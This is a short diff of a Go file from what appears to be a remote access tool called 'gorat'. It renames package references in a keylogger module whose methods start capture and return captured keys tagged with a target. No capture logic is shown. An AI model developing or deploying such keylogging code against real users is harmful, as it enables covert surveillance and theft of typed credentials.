@@ -7,7 +7,7 @@ import (
 	"sync"
 	"time"
 
-	"gorat/common"
+	"gorat/pkg/protocol"
 )
 
 // Keylogger handles keyboard input monitoring
@@ -30,7 +30,7 @@ func NewKeylogger() *Keylogger {
 }
 
 // Start starts the keylogger
-func (kl *Keylogger) Start(payload *common.KeyloggerPayload) error {
+func (kl *Keylogger) Start(payload *protocol.KeyloggerPayload) error {
 	kl.mu.Lock()
 	defer kl.mu.Unlock()
 
@@ -101,10 +101,10 @@ func (kl *Keylogger) IsRunning() bool {
 }
 
 // GetData returns captured keylogger data
-func (kl *Keylogger) GetData() *common.KeyloggerDataPayload {
+func (kl *Keylogger) GetData() *protocol.KeyloggerDataPayload {
 	select {
 	case data := <-kl.dataChan:
-		return &common.KeyloggerDataPayload{
+		return &protocol.KeyloggerDataPayload{
 			Target:    kl.target,
 			Keys:      data,
 			Timestamp: time.Now(),
